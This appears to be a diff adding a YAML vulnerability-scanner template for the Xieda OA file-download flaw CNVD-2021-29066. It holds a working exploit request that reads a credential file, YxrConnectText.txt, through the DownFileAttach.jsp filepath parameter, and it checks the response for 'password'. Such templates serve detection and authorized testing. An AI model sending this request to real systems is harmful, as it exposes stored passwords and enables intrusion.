@@ -1,0 +1,17 @@
+name: Xieda OA Filedownload CNVD-2021-29066
+manual: true
+query: body="协达软件"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /interface/DownFileAttach.jsp?filepath=/WEB-INF/classes/YxrConnectText.txt
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"password")
+expression: r0()
+detail:
+  links:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2021-29066
+  description: Xieda OA
+  tags: filedownload
